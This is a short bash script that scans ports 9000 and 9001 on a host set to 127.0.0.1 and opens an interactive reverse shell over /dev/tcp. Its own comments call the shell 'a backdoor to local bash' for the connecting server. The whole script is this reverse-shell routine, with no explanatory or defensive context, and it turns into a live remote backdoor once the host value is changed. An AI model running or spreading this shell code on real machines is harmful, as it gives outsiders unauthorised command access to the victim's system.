#!/bin/bash


function connect_to_server()
{
    # We start connecting too any open port
    HOST=127.0.0.1
    echo "Scanning for server..."
    for port in $(seq 9000 9001); do
	# We connect back to the server giving it a backdoor to local bash
        echo "Connecting on port: $port"
	bash -i </dev/tcp/$HOST/$port 1>&0
	if [[ $? == 0 ]]; then
		exit 0
	fi
    done
    echo "Server not found. Please try again later."
    exit 1
}

connect_to_server

